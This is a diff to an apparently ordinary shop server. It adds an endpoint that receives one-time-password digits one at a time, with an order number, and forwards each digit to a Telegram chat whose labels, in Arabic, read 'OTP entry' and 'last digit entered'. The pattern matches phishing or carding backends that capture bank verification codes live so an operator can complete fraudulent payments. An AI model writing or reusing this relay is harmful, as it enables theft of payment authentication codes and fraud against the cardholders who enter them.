@@ -368,6 +368,30 @@ async function startServer() {
     }
   });
 
+  app.post("/api/transactions/otp", async (req, res) => {
+    try {
+      const { order_id, otpDigit } = req.body;
+      if (!order_id || typeof otpDigit === "undefined") {
+        return res.status(400).json({ error: "order_id and otpDigit required" });
+      }
+      const chatId = process.env.TELEGRAM_CHAT_ID;
+      if (bot && chatId) {
+        let msg = `🔐 <b>إدخال رمز التحقق (OTP)</b>\n`;
+        msg += `🧾 <b>رقم الطلب:</b> ${order_id}\n`;
+        msg += `🔑 <b>أخر رقم مدخل:</b> <code>***${otpDigit}</code>`;
+        try {
+          await bot.sendMessage(chatId, msg, { parse_mode: "HTML" });
+        } catch (e) {
+          console.error("Telegram send otp:", e);
+        }
+      }
+      res.json({ success: true });
+    } catch (e) {
+      console.error(e);
+      res.status(500).json({ error: "Failed to submit OTP" });
+    }
+  });
+
   app.get("/api/offers", async (_req, res) => {
     try {
       const offers = await store.listOffers();
